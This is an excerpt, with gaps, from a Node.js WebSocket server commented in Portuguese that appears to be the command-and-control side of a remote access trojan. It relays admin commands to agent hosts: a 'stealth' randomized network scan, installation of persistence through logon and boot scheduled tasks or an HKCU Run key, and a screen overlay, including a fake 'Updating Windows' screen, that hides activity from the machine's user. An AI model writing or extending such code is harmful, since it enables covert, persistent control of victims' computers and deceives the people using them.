  ...
  ws.on("message", (data, isBinary) => {
    ...
    if (ws.role === "admin") {
      ...
      switch (msg.type) {
        ...
        case "net_scan": {
          ...
          // stealth=true → modo discreto no Agent (sequencial, ordem aleatória, orçamento de tempo).
          const requestId = newRequest(ws, a, "net_scan", 180_000, true);
          send(a.ws, { type: "net_scan", requestId, stealth: msg.stealth === true });
          return;
        }
        ...
        case "persist": {
          // Instala persistência no host do Agent (não exige permissão de visualização).
          // mode: task (ONLOGON interativo) | run (HKCU Run) | system (ONBOOT SYSTEM) | remove (desinstala).
          const mode = String(msg.mode || "").trim();
          if (!["task", "run", "system", "remove"].includes(mode)) {
            return send(ws, { type: "error", message: "Modo de persistência inválido. Use task, run, system ou remove." });
          }
          const requestId = newRequest(ws, a, "persist", 60_000, true);
          send(a.ws, { type: "persist", requestId, mode });
          return;
        }

        case "screen_overlay": {
          // Ocultação de tela no host do Agent (não exige permissão de visualização).
          // mode: blank (tela preta) | update (fake "Atualizando o Windows") |
          //       image (overlay.png ao lado do executável) | off (remove o overlay).
          const mode = String(msg.mode || "").trim();
          if (!["blank", "update", "image", "off"].includes(mode)) {
            return send(ws, { type: "error", message: "Modo de ocultação inválido. Use blank, update, image ou off." });
          }
          const requestId = newRequest(ws, a, "screen_overlay", 60_000, true);
          send(a.ws, { type: "screen_overlay", requestId, mode });
          return;
        }
    ...
    if (ws.role === "agent") {
      ...
      switch (msg.type) {
        ...
        case "persist_result": {
          const hit = getPending(msg.requestId, a.id, "persist");
          if (!hit) return;
          send(hit.admin, {
            type: "persist_result",
            agentId: a.id,
        ...
        case "screen_overlay_result": {
          const hit = getPending(msg.requestId, a.id, "screen_overlay");
          if (!hit) return;
          send(hit.admin, {
            type: "screen_overlay_result",
            agentId: a.id,
            requestId: hit.p.requestId,
            ok: msg.ok === true,
            log: Array.isArray(msg.log) ? msg.log : [],
